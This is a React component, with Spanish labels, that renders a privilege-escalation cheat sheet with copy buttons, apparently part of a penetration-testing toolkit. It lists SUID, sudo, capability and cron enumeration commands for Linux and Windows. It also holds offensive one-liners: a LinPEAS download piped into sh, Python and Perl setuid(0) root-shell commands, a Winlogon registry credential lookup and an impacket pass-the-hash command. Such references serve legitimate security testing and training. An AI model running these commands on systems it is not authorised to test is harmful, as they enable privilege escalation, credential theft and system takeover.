import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp, AlertTriangle } from 'lucide-react'

const COLOR = '#f59e0b'

const COMMANDS = [
  {
    cat: '🐧 Linux — Vectores SUID/SGID',
    items: [
      { cmd:'find / -perm -4000 -type f 2>/dev/null', desc:'Buscar binarios con bit SUID (se ejecutan como su propietario, a menudo root)' },
      { cmd:'find / -perm -2000 -type f 2>/dev/null', desc:'Buscar binarios con bit SGID (se ejecutan con el grupo propietario)' },
      { cmd:'find / -perm -4000 -user root -type f 2>/dev/null', desc:'SUID solo propiedad de root — los más peligrosos' },
      { cmd:'find / -writable -type f 2>/dev/null | grep -v proc', desc:'Archivos escribibles por el usuario actual' },
      { cmd:'find / -writable -type d 2>/dev/null', desc:'Directorios escribibles — posible DLL hijacking o env injection' },
    ]
  },
  {
    cat: '🐧 Linux — Sudo y Capabilities',
    items: [
      { cmd:'sudo -l', desc:'Ver comandos que puede ejecutar el usuario como sudo (sin contraseña o con ella)' },
      { cmd:'sudo -u root /bin/bash', desc:'Shell root si sudo bash está permitido' },
      { cmd:'capsh --print', desc:'Ver capabilities del proceso actual' },
      { cmd:'getcap -r / 2>/dev/null', desc:'Buscar binarios con capabilities asignadas (ej: python3 con cap_setuid)' },
      { cmd:'cat /etc/sudoers', desc:'Ver configuración sudoers (requiere permisos)' },
    ]
  },
  {
    cat: '🐧 Linux — Cron y Servicios',
    items: [
      { cmd:'crontab -l', desc:'Ver cron del usuario actual' },
      { cmd:'cat /etc/crontab ; ls -la /etc/cron.*', desc:'Ver todas las tareas cron del sistema' },
      { cmd:'cat /var/spool/cron/crontabs/*', desc:'Ver crons de todos los usuarios (requiere permisos)' },
      { cmd:'ls -la /etc/init.d/ /etc/systemd/system/', desc:'Ver servicios de inicio — posibles archivos con permisos débiles' },
      { cmd:'ps auxf', desc:'Árbol de procesos completo con propietarios' },
      { cmd:'cat /etc/rc.local', desc:'Script de inicio del sistema — vector de persistencia y privesc' },
    ]
  },
  {
    cat: '🚀 LinPEAS / LinEnum — Automatización',
    items: [
      { cmd:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc:'Ejecutar LinPEAS directamente (requiere internet en el objetivo)' },
      { cmd:'wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', desc:'Descargar LinPEAS para transferir al objetivo' },
      { cmd:'chmod +x linpeas.sh && ./linpeas.sh -a > /tmp/linpeas_output.txt 2>&1', desc:'Ejecutar con all checks y guardar output completo' },
      { cmd:'python3 -c "import pty;pty.spawn(\"/bin/bash\")"', desc:'Obtener shell TTY completa desde shell básica' },
      { cmd:'script /dev/null -c bash', desc:'Método alternativo para TTY completa' },
    ]
  },
  {
    cat: '🪟 Windows — Escalada de Privilegios',
    items: [
      { cmd:'whoami /priv', desc:'Ver privilegios del token actual — buscar SeImpersonatePrivilege, SeDebugPrivilege' },
      { cmd:'whoami /groups', desc:'Ver grupos del usuario — buscar Local Administrators' },
      { cmd:'net localgroup Administrators', desc:'Ver miembros del grupo Administrators local' },
      { cmd:'systeminfo', desc:'Info del sistema: SO, parches instalados, hotfixes (comparar con CVEs)' },
      { cmd:'sc qc servicio', desc:'Ver configuración de servicio — ruta del binario (posible unquoted service path)' },
      { cmd:'accesschk.exe -uws "Everyone" C:\\', desc:'Buscar recursos accesibles por Everyone' },
    ]
  },
  {
    cat: '🪟 Windows — WinPEAS y herramientas',
    items: [
      { cmd:'winPEASx64.exe', desc:'Enumeración automática de vectores de escalada en Windows (equivalente a LinPEAS)' },
      { cmd:'winPEASx64.exe quiet', desc:'Modo silencioso — menos output pero más rápido' },
      { cmd:'Get-LocalGroupMember Administrators', desc:'Ver admins locales desde PowerShell' },
      { cmd:'Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\\Microsoft*"} | Select TaskName, TaskPath', desc:'Tareas programadas no-Microsoft — posibles vectores' },
      { cmd:'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', desc:'Buscar AutoAdminLogon con credenciales en registro' },
    ]
  },
  {
    cat: '📋 GTFOBins / LOLBAS — Referencias',
    items: [
      { cmd:'# GTFOBins: https://gtfobins.github.io/ — binarios Unix para privesc', desc:'' },
      { cmd:'# LOLBAS: https://lolbas-project.github.io/ — binarios Windows legítimos para privesc', desc:'' },
      { cmd:'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', desc:'Si python tiene SUID o cap_setuid — escalar a root' },
      { cmd:'perl -e "use POSIX; setuid(0); exec \'/bin/bash\';"', desc:'Si perl tiene SUID' },
      { cmd:'find / -name "*.py" -writable 2>/dev/null', desc:'Scripts Python ejecutados por root que podamos modificar' },
      { cmd:'# Pass-the-Hash (Windows): impacket-psexec -hashes :NTLM_HASH admin@IP', desc:'' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  if (!text || text.startsWith('#')) return null
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(245,158,11,0.12)', color: copied ? '#10b981' : '#f59e0b' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolPrivesc() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="⬆️" name="Privilege Escalation" color={COLOR} badge="LinPEAS · WinPEAS · SUID · sudo -l · GTFOBins · LOLBAS">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(245,158,11,0.08)', border:'1px solid rgba(245,158,11,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <AlertTriangle size={13} style={{ color:'#f59e0b', flexShrink:0, marginTop:1 }}/>
          <span>La escalada de privilegios busca pasar de usuario limitado a root/SYSTEM. Los vectores más comunes: SUID mal configurado, sudo permisivo, servicios con binarios escribibles y tareas cron con scripts modificables.</span>
        </div>

        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(180px,1fr))', gap:10, marginBottom:24 }}>
          {[
            { label:'SUID/SGID', color:'#ef4444', icon:'🔴', desc:'Binarios que heredan permisos de propietario' },
            { label:'sudo -l', color:'#f59e0b', icon:'⚡', desc:'Comandos ejecutables como otro usuario' },
            { label:'Cron jobs', color:'#06b6d4', icon:'⏰', desc:'Scripts ejecutados por root periódicamente' },
            { label:'Capabilities', color:'#a78bfa', icon:'🎯', desc:'Permisos específicos asignados a binarios' },
            { label:'LinPEAS', color:'#10b981', icon:'🚀', desc:'Enumeración automática de vectores Linux' },
          ].map(item => (
            <div key={item.label} style={{ background:'rgba(255,255,255,0.03)', border:`1px solid ${item.color}20`, borderRadius:10, padding:'12px', textAlign:'center' }}>
              <div style={{ fontSize:18, marginBottom:4 }}>{item.icon}</div>
              <div style={{ color:item.color, fontSize:12, fontWeight:700, marginBottom:4 }}>{item.label}</div>
              <div style={{ color:'rgba(255,255,255,0.35)', fontSize:10 }}>{item.desc}</div>
            </div>
          ))}
        </div>

        {COMMANDS.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom: item.desc ? 6 : 0 }}>
                      <code style={{ flex:1, fontSize:11, color: item.cmd.startsWith('#') ? 'rgba(255,255,255,0.3)' : '#fcd34d', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    {item.desc && <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
